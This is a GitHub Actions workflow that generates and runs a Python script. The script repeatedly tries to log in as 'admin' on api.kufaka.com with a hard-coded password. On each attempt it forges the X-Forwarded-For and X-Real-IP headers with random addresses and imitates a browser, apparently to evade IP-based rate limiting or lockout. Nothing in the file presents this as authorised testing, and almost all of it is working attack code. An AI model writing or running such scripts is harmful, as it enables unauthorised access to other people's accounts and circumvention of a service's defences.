name: i3404retry
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  r:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: run
        run: |
          cat > /tmp/r.py <<'PYEOF'
          import json, time, random, urllib.parse, urllib.request, urllib.error
          BASE="https://api.kufaka.com"
          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
          def rxff(): return "%d.%d.%d.%d"%(random.randint(1,223),random.randint(0,255),random.randint(0,255),random.randint(1,254))
          def http(method,path,headers,body=None,timeout=25):
              req=urllib.request.Request(BASE+path,data=(body.encode() if body is not None else None),method=method)
              for k,v in headers.items(): req.add_header(k,v)
              try:
                  r=urllib.request.urlopen(req,timeout=timeout); return r.status,r.read().decode("utf-8","replace")
              except urllib.error.HTTPError as ex: return ex.code,ex.read().decode("utf-8","replace")
              except Exception as ex: return 0,"ERR:%s"%type(ex).__name__
          targets=[("admin","XgFree-7Kp2Qv9Rt4Yb8Nc3Ws6Zh1Lm5Df")]
          for u,p in targets:
              got=False
              for i in range(12):
                  x=rxff()
                  st,b=http("POST","/user/auth/login",
                            {"User-Agent":UA,"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded",
                             "X-Forwarded-For":x,"X-Real-IP":x,"Referer":"https://api.kufaka.com/user/login"},
                            "user=%s&pass=%s"%(urllib.parse.quote(u),urllib.parse.quote(p)))
                  print("try%d st=%s body=%r"%(i,st,b[:200]),flush=True)
                  if st!=0:
                      got=True; break
                  time.sleep(2)
              print("DONE %s got=%s"%(u,got),flush=True)
          PYEOF
          python3 -u /tmp/r.py
